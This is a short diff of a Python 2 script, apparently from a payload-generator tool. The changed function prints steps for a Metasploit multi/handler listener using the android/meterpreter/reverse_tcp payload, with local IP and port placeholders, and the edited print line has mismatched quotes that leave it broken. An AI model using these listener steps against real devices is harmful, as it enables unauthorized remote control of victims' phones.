@@ -107,7 +107,7 @@ def windows():
         print '\33[33;1m msfconsole'
         print '\33[33;1mmulti handler'
         print '\33[33;1m set payload android/meterpreter/reverse_tcp'
-        print '\33[33;1m set LHOST = \33[33;1m LOKAL IP 'format[ip]'
+        print '\33[33;1m set LHOST = LOKAL IP 'format[ip]'
         print '\33[33;1m set LPORT = format[port]'
         print 'Exploit'
         print ''
